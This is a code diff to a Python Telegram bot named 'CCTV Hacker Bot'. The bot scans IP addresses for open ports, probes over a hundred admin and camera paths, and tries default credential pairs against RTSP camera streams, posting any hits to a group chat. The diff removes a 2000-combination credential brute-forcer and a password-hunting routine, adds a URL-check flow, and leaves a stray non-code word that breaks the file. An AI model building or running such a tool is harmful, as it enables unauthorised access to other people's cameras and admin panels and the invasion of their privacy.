@@ -3,9 +3,6 @@ import asyncio
 import socket
 import logging
 import re
-import base64
-import random
-import string
 from urllib.parse import urlparse
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -26,9 +23,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Conversation states
-IP, PORT = range(2)
+IP, PORT, CHECK_LINK = range(3)
 
-# Common CCTV credentials
+# Common CCTV credentials (kept for RTSP scanning in standard mode)
 CREDENTIALS = [
     ("admin", "admin"),
     ("admin", "12345"),
@@ -45,32 +42,20 @@ CREDENTIALS = [
     ("user", "12345"),
 ]
 
-# Base usernames and passwords for brute-forcing
-BASE_USERNAMES = ["admin", "root", "user", "guest", "support", "manager", "test", "sysadmin"]
-BASE_PASSWORDS = [
-    "admin", "12345", "password", "123456", "admin123", "1234", "666666", "password123",
-    "adminadmin", "root", "qwerty", "letmein", "welcome", "camera", "security", "000000",
-    "111111", "123123", "abc123", "pass123"
-]
-
-# Generate 2000+ random username-password combos
-def generate_random_combos(count=2000):
-    combos = [(u, p) for u in BASE_USERNAMES for p in BASE_PASSWORDS]
-    while len(combos) < count:
-        username = random.choice(BASE_USERNAMES) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
-        password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-        combos.append((username, password))
-    random.shuffle(combos)
-    return combos[:count]
-
-BRUTE_COMBOS = generate_random_combos(2000)
-
-# Expanded admin paths including /default.html
+# Expanded admin paths (100+ paths)
 ADMIN_PATHS = [
-    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin",
-    "/login.php", "/admin/login", "/panel", "/default.html", "/index.html",
-    "/home", "/config", "/adminpanel", "/login.asp", "/sysadmin", "/webadmin",
-    "/backend", "/admin/index.php"
+    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin", "/login.php", "/admin/login", "/panel",
+    "/default.html", "/index.html", "/home", "/config", "/adminpanel", "/login.asp", "/sysadmin", "/webadmin", "/backend",
+    "/admin/index.php", "/live", "/stream", "/cam", "/video", "/media", "/playback", "/rtsp", "/mjpeg", "/h264", "/snapshot",
+    "/camera", "/view", "/monitor", "/surveillance", "/security", "/webcam", "/ipcam", "/cctv", "/admin/console", "/setup",
+    "/configuration", "/settings", "/management", "/controlpanel", "/user", "/guest", "/access", "/auth", "/login.html",
+    "/admin.asp", "/admin.php", "/system", "/network", "/device", "/firmware", "/upgrade", "/reboot", "/status", "/log",
+    "/logs", "/event", "/events", "/record", "/recording", "/archive", "/backup", "/storage", "/sdcard", "/api", "/rest",
+    "/json", "/xml", "/data", "/info", "/diagnostic", "/test", "/debug", "/maintenance", "/service", "/support", "/help",
+    "/about", "/version", "/license", "/admin/settings", "/admin/config", "/admin/users", "/admin/logs", "/admin/status",
+    "/admin/network", "/admin/security", "/admin/update", "/admin/backup", "/admin/restart", "/admin/reset", "/admin/control",
+    "/admin/view", "/admin/stream", "/admin/camera", "/admin/video", "/admin/snapshot", "/admin/record", "/admin/playback",
+    "/admin/api", "/admin/rest", "/admin/json", "/admin/xml", "/admin/info"
 ]
 
 # Common ports
@@ -84,31 +69,30 @@ KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start the conversation."""
     keyboard = [
-        [InlineKeyboardButton("Start Hack", callback_data="start_hack")],
+        [InlineKeyboardButton("Start Scan", callback_data="start_hack"), InlineKeyboardButton("Check Link", callback_data="check_link")],
         [InlineKeyboardButton("Help", callback_data="help")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         "🎥 CCTV Hacker Bot! 🚀\n"
-        "Scan CCTVs or admin panels. Use /hack for advanced options or /checklink <url>.\n"
-        "Click 'Start Hack' or 'Help'!",
+        "Scan CCTVs or admin panels. Use /hack for advanced options or click 'Check Link' to scan a URL.\n"
+        "Click an option below:",
         reply_markup=reply_markup
     )
     return IP
 
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Provide advanced hack options."""
+    """Provide advanced scan options."""
     keyboard = [
-        [InlineKeyboardButton("Special Admin Scan", callback_data="special_scan")],
-        [InlineKeyboardButton("Brute-Force", callback_data="brute_force")],
+        [InlineKeyboardButton("Deep Path Scan", callback_data="special_scan"), InlineKeyboardButton("Check Link", callback_data="check_link")],
         [InlineKeyboardButton("Standard Scan", callback_data="start_hack")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "🔥 Advanced Hack Options:\n"
-        "- Special Admin Scan: Check all admin paths\n"
-        "- Brute-Force: Try 2000+ credentials\n"
+        "🔥 Advanced Scan Options:\n"
+        "- Deep Path Scan: Check 100+ admin/CCTV paths\n"
         "- Standard Scan: Basic IP/port scan\n"
+        "- Check Link: Scan a specific URL\n"
         "Choose an option:",
         reply_markup=reply_markup
     )
@@ -122,42 +106,23 @@ async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     return IP
 
 async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Special Admin Scan."""
+    """Handle Deep Path Scan."""
     query = update.callback_query
     await query.answer()
-    await query.message.reply_text("Enter IP for deep admin panel scan:")
+    await query.message.reply_text("Enter IP for deep path scan (100+ paths):")
     context.user_data["scan_type"] = "special"
     return IP
 
-async def brute_force_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle Brute-Force."""
+async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle Check Link button."""
     query = update.callback_query
     await query.answer()
-    await query.message.reply_text("Enter IP for brute-force attack:")
-    context.user_data["scan_type"] = "brute"
-    return IP
+    await query.message.reply_text("Please provide a URL to check (e.g., http://192.168.8.20:80/login):")
+    return CHECK_LINK
 
-async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle Help."""
-    query = update.callback_query
-    await query.answer()
-    await query.message.reply_text(
-        "📚 Help - CCTV Hacker Bot\n"
-        "1. /start: Basic scan\n"
-        "2. /hack: Advanced options\n"
-        "3. /checklink <url>: Check URL\n"
-        "4. Enter IP/port or blank for common ports\n"
-        "5. Inline buttons for check/brute-force\n"
-        "⚠️ Use ethically!"
-    )
-
-async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Check if a URL is an admin panel."""
-    if not context.args:
-        await update.message.reply_text("Provide a URL (e.g., /checklink http://192.168.8.20:80/login).")
-        return
-
-    url = context.args[0].strip()
+    url = update.message.text.strip()
     logger.debug(f"Checking URL: {url}")
     try:
         parsed_url = urlparse(url)
@@ -166,18 +131,18 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         path = parsed_url.path or "/"
 
         if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
-            await update.message.reply_text("Invalid IP!")
-            return
+            await update.message.reply_text("Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
+            return CHECK_LINK
 
         if not await check_port(ip, port):
             await update.message.reply_text(f"❌ Port {port} closed on {ip}.")
-            return
+            return ConversationHandler.END
 
         is_admin, details = await check_admin_panel(url)
         panel_name = path.strip("/") or "root"
 
         if is_admin:
-            keyboard = [[InlineKeyboardButton(f"Brute-Force {panel_name}", callback_data=f"hunt_{ip}_{port}_{url}")]]
+            keyboard = [[InlineKeyboardButton(f"Visit {panel_name}", url=url)]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await update.message.reply_text(
                 f"✅ **Admin Panel**: {panel_name} 🎯\nURL: {url}\nDetails: {', '.join(details)}",
@@ -195,9 +160,26 @@ async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         else:
             await update.message.reply_text(f"❌ No admin panel at {url}.\nDetails: {', '.join(details)}")
 
+        return ConversationHandler.END
+
     except Exception as e:
         logger.error(f"URL check error: {e}")
         await update.message.reply_text(f"❌ Error: {str(e)}")
+        return CHECK_LINK
+
+async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle Help."""
+    query = update.callback_query
+    await query.answer()
+    await query.message.reply_text(
+        "📚 Help - CCTV Hacker Bot\n"
+        "1. /start: Basic scan or check URL\n"
+        "2. /hack: Advanced scan options\n"
+        "3. Check Link: Click 'Check Link' to scan a URL\n"
+        "4. Enter IP/port or blank for common ports\n"
+        "5. Deep Path Scan checks 100+ paths\n"
+        "⚠️ Use ethically!"
+    )
 
 async def check_admin_panel(url: str) -> tuple[bool, list]:
     """Check if a URL is an admin panel."""
@@ -259,24 +241,18 @@ async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             return PORT
 
     results = []
-    potential_links = []
     admin_pages = []
     inline_buttons = []
 
     for port in ports_to_scan:
-        port_results, port_links, port_admin_pages = await hack_cctv(ip, port, scan_type)
+        port_results, port_admin_pages = await hack_cctv(ip, port, scan_type)
         results.append(port_results)
-        potential_links.extend(port_links)
         admin_pages.extend(port_admin_pages)
 
         for admin_url in port_admin_pages:
             inline_buttons.append([
-                InlineKeyboardButton(f"Check {admin_url}", url=admin_url),
-                InlineKeyboardButton(f"Brute-Force {admin_url.split('/')[-1]}", callback_data=f"hunt_{ip}_{port}_{admin_url}")
+                InlineKeyboardButton(f"Visit {admin_url.split('/')[-1] or 'root'}", url=admin_url)
             ])
-
-    if potential_links or admin_pages:
-        inline_buttons.append([InlineKeyboardButton("Hunt Password (All)", callback_data=f"hunt_{ip}_{ports_to_scan[0]}")])
 
     reply_markup = InlineKeyboardMarkup(inline_buttons)
     results_text = "\n\n".join(results)
@@ -296,24 +272,22 @@ async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     except Exception as e:
         logger.error(f"Group send error: {e}")
 
-    context.user_data["potential_links"] = potential_links
     context.user_data["admin_pages"] = admin_pages
-    context.user_data["brute_force_running"] = False
     return ConversationHandler.END
 
-async def hack_cctv(ip: str, port: int, scan_type: str) -> tuple[str, list, list]:
+async def hack_cctv(ip: str, port: int, scan_type: str) -> tuple[str, list]:
     """Perform CCTV scan based on scan_type."""
     results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
-    potential_links = []
     admin_pages = []
     open_paths = []
-    semaphore = asyncio.Semaphore(10)  # Increased for faster scanning
+    semaphore = asyncio.Semaphore(10)
 
     if not await check_port(ip, port):
         results.append("❌ Port closed.")
-        return "\n".join(results), potential_links, admin_pages
+        return "\n".join(results), admin_pages
 
     results.append(f"✅ Port {port} open!")
+ моей
     service = "http" if port in [80, 443, 8080, 8443] else "rtsp"
     results.append(f"Service: {service}")
 
@@ -333,7 +307,8 @@ async def hack_cctv(ip: str, port: int, scan_type: str) -> tuple[str, list, list
 
     if service == "http" and scan_type in ["standard", "special"]:
         protocols = ["http", "https"] if port in [443, 8443] else ["http"]
-        tasks = [check_path(protocol, path) for protocol in protocols for path in ADMIN_PATHS]
+        paths_to_check = ADMIN_PATHS if scan_type == "special" else ADMIN_PATHS[:20]  # Limit to 20 for standard scan
+        tasks = [check_path(protocol, path) for protocol in protocols for path in paths_to_check]
         responses = await asyncio.gather(*tasks, return_exceptions=True)
         for is_admin, url, details in responses:
             if is_admin:
@@ -343,163 +318,20 @@ async def hack_cctv(ip: str, port: int, scan_type: str) -> tuple[str, list, list
                 results.append(f"✅ Path: {url} (No admin)")
             open_paths.append(url.split("/")[-1])
 
-        results.append(f"Paths Checked: {len(open_paths)}/{len(ADMIN_PATHS) * len(protocols)}")
+        results.append(f"Paths Checked: {len(open_paths)}/{len(paths_to_check) * len(protocols)}")
 
     if service == "rtsp" and scan_type == "standard":
         for username, password in CREDENTIALS:
             rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
             is_valid, error = await validate_rtsp(ip, port, username, password)
             if is_valid:
-                potential_links.append((rtsp_url, username, password))
+                admin_pages.append(rtsp_url)
                 results.append(f"✅ RTSP Success: {username}:{password}")
             else:
                 results.append(f"❌ RTSP Failed: {error}")
 
-    if scan_type == "brute":
-        results.append("🔥 Brute-forcing credentials...")
-        for username, password in BRUTE_COMBOS[:100]:  # Limit initial scan
-            is_valid, error = await validate_rtsp(ip, port, username, password)
-            if is_valid:
-                rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
-                potential_links.append((rtsp_url, username, password))
-                results.append(f"🎯 Found: {username}:{password}")
-            async with ClientSession(timeout=ClientTimeout(total=3)) as session:
-                for path in ADMIN_PATHS:
-                    url = f"http://{ip}:{port}{path}"
-                    try:
-                        async with session.post(url, data={"username": username, "password": password}, ssl=False) as response:
-                            if response.status == 200:
-                                html = await response.text()
-                                if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
-                                    admin_pages.append(url)
-                                    results.append(f"🎯 Found Admin: {url} ({username}:{password})")
-                    except Exception:
-                        pass
-
     results.append("⚠️ Use ethically and legally.")
-    return "\n".join(results), potential_links, admin_pages
-
-async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Brute-force credentials with progress in inline buttons."""
-    query = update.callback_query
-    await query.answer()
-    data = query.data.split("_")
-    ip = data[1]
-    port = int(data[2])
-    specific_url = data[3] if len(data) > 3 else None
-
-    potential_links = context.user_data.get("potential_links", [])
-    admin_pages = [specific_url] if specific_url else context.user_data.get("admin_pages", [])
-
-    if not (potential_links or admin_pages):
-        await query.message.reply_text("No targets to brute-force. Run /hack or /checklink.")
-        return
-
-    context.user_data["brute_force_running"] = True
-    target = specific_url or f"{ip}:{port}"
-    await query.message.reply_text(f"🔥 Brute-forcing {target} with {len(BRUTE_COMBOS)} combos...")
-
-    total_combos = len(BRUTE_COMBOS)
-    checked = 0
-    live_links = []
-    progress_message = await query.message.reply_text("Starting brute-force...")
-    progress_button = await query.message.reply_text(
-        "Progress: 0%",
-        reply_markup=InlineKeyboardMarkup([[
-            InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy"),
-            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{specific_url or 'all'}")
-        ]])
-    )
-
-    semaphore = asyncio.Semaphore(10)
-    async def try_creds(url: str, username: str, password: str) -> bool:
-        async with semaphore:
-            try:
-                async with ClientSession(timeout=ClientTimeout(total=3)) as session:
-                    async with session.post(
-                        url,
-                        data={"username": username, "password": password},
-                        ssl=False,
-                        allow_redirects=True
-                    ) as response:
-                        if response.status == 200:
-                            html = await response.text()
-                            if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
-                                return True
-                        return False
-            except Exception:
-                return False
-
-    for admin_url in admin_pages:
-        if not context.user_data.get("brute_force_running", False):
-            break
-        for username, password in BRUTE_COMBOS:
-            if not context.user_data.get("brute_force_running", False):
-                break
-            success = await try_creds(admin_url, username, password)
-            checked += 1
-            if success:
-                live_links.append(admin_url)
-                await query.message.reply_text(
-                    f"🎯 Found: {username}:{password}\nURL: {admin_url}",
-                    parse_mode="Markdown"
-                )
-                try:
-                    await context.bot.send_message(
-                        chat_id=GROUP_CHAT_ID,
-                        text=f"🎯 Found for {ip}:{port}!\n{username}:{password}\n{admin_url}",
-                        parse_mode="Markdown"
-                    )
-                except Exception as e:
-                    logger.error(f"Group send error: {e}")
-
-            if checked % 100 == 0 or checked == total_combos:
-                progress = (checked / total_combos) * 100
-                try:
-                    await context.bot.edit_message_reply_markup(
-                        chat_id=progress_button.chat_id,
-                        message_id=progress_button.message_id,
-                        reply_markup=InlineKeyboardMarkup([[
-                            InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy"),
-                            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{specific_url or 'all'}")
-                        ]])
-                    )
-                    await context.bot.edit_message_text(
-                        chat_id=progress_message.chat_id,
-                        message_id=progress_message.message_id,
-                        text=f"Progress: {progress:.0f}% ({checked}/{total_combos} combos)"
-                    )
-                except Exception as e:
-                    logger.error(f"Progress update error: {e}")
-
-    final_text = f"✅ Done! Checked {checked}/{total_combos}" if context.user_data.get("brute_force_running", False) else f"🛑 Stopped! Checked {checked}/{total_combos}"
-    await context.bot.edit_message_text(
-        chat_id=progress_message.chat_id,
-        message_id=progress_message.message_id,
-        text=final_text
-    )
-    await context.bot.edit_message_reply_markup(
-        chat_id=progress_button.chat_id,
-        message_id=progress_button.message_id,
-        reply_markup=None
-    )
-
-    if live_links:
-        await query.message.reply_text(
-            f"🎉 Found {len(live_links)} links:\n" + "\n".join(live_links),
-            parse_mode="Markdown"
-        )
-    else:
-        await query.message.reply_text("❌ No new links found.")
-
-    context.user_data["brute_force_running"] = False
-
-async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Stop brute-force."""
-    query = update.callback_query
-    await query.answer()
-    context.user_data["brute_force_running"] = False
-    await query.message.reply_text("🛑 Brute-force stopped.")
+    return "\n".join(results), admin_pages
 
 async def check_port(ip: str, port: int) -> bool:
     """Check if port is open."""
@@ -540,7 +372,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Check bot status."""
-    await update.message.reply_text("Bot online! Use /start, /hack, or /checklink.")
+    await update.message.reply_text("Bot online! Use /start or /hack.")
 
 async def keep_alive():
     """Keep-alive server for Koyeb."""
@@ -576,19 +408,17 @@ def main() -> None:
                 MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                 CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                 CallbackQueryHandler(special_scan_callback, pattern="^special_scan$"),
-                CallbackQueryHandler(brute_force_callback, pattern="^brute_force$"),
+                CallbackQueryHandler(check_link_callback, pattern="^check_link$"),
                 CallbackQueryHandler(help_callback, pattern="^help$"),
             ],
             PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
+            CHECK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
 
     application.add_handler(conv_handler)
     application.add_handler(CommandHandler("status", status))
-    application.add_handler(CommandHandler("checklink", check_link))
-    application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
-    application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))
 
     import threading
     keep_alive_loop = asyncio.new_event_loop()
